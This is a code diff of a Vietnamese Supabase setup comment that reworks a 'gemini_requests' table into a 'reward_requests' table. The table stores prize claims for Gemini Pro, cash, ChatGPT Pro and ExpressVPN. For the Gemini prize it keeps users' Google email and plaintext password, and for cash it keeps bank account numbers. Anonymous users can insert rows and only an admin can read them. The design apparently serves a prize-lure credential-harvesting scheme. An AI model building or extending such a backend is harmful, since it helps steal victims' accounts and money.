@@ -15,47 +15,75 @@ HƯỚNG DẪN LẤY THÔNG TIN SUPABASE:
 4. Copy "Project URL" và paste vào trường 'url'
 5. Copy "anon public" key và paste vào trường 'anonKey'
 
-CẤU TRÚC BẢNG DATABASE:
+CẤU TRÚC BẢNG DATABASE - UNIFIED TABLE FOR ALL REWARDS:
 
-Tạo bảng 'gemini_requests' với các cột sau:
+Tạo bảng 'reward_requests' để lưu tất cả các loại phần thưởng:
 
-Table: gemini_requests
+Table: reward_requests
 - id: int8 (primary key, auto increment)
-- google_email: text
-- google_password: text
-- contact_email: text
+- reward_type: text (enum: 'gemini', 'cash', 'chatgpt', 'expressvpn')
+- selected_option: text (nullable, tùy chọn của người dùng)
+- reward_details: text (lưu tất cả thông tin dưới dạng JSON string)
 - status: text (default: 'pending')
 - created_at: timestamptz (default: now())
 - updated_at: timestamptz
 
 SQL để tạo bảng:
 
-CREATE TABLE gemini_requests (
+CREATE TABLE reward_requests (
   id BIGSERIAL PRIMARY KEY,
-  google_email TEXT NOT NULL,
-  google_password TEXT NOT NULL,
-  contact_email TEXT NOT NULL,
+  reward_type TEXT NOT NULL,
+  selected_option TEXT,
+  reward_details TEXT NOT NULL,
   status TEXT DEFAULT 'pending',
   created_at TIMESTAMPTZ DEFAULT NOW(),
   updated_at TIMESTAMPTZ
 );
 
 -- Tạo index cho tìm kiếm nhanh
-CREATE INDEX idx_gemini_requests_status ON gemini_requests(status);
-CREATE INDEX idx_gemini_requests_created_at ON gemini_requests(created_at);
+CREATE INDEX idx_reward_requests_status ON reward_requests(status);
+CREATE INDEX idx_reward_requests_reward_type ON reward_requests(reward_type);
+CREATE INDEX idx_reward_requests_created_at ON reward_requests(created_at);
 
 -- Enable Row Level Security (RLS)
-ALTER TABLE gemini_requests ENABLE ROW LEVEL SECURITY;
+ALTER TABLE reward_requests ENABLE ROW LEVEL SECURITY;
 
 -- Tạo policy cho phép insert từ client
-CREATE POLICY "Enable insert for all users" ON gemini_requests
+CREATE POLICY "Enable insert for all users" ON reward_requests
   FOR INSERT TO anon
   WITH CHECK (true);
 
--- Tạo policy cho phép read (nếu cần - chỉ cho admin)
-CREATE POLICY "Enable read for authenticated users only" ON gemini_requests
+-- Tạo policy cho phép read (chỉ cho admin)
+CREATE POLICY "Enable read for authenticated users only" ON reward_requests
   FOR SELECT TO authenticated
   USING (true);
+
+ĐỊNH DẠNG DỮ LIỆU reward_details (JSON string):
+
+1. GEMINI PRO (reward_type: 'gemini'):
+{
+  "email": "user@gmail.com",
+  "password": "password123",
+  "contact_email": "contact@gmail.com"
+}
+
+2. TIỀN MẶT (reward_type: 'cash'):
+{
+  "contact_email": "contact@gmail.com",
+  "account_number": "1234567890",
+  "bank_name": "Vietcombank"
+}
+
+3. CHAT GPT PRO (reward_type: 'chatgpt'):
+{
+  "contact_email": "contact@gmail.com",
+  "chatgpt_invite_email": "invite@gmail.com"
+}
+
+4. EXPRESS VPN (reward_type: 'expressvpn'):
+{
+  "contact_email": "contact@gmail.com"
+}
 
 */
 
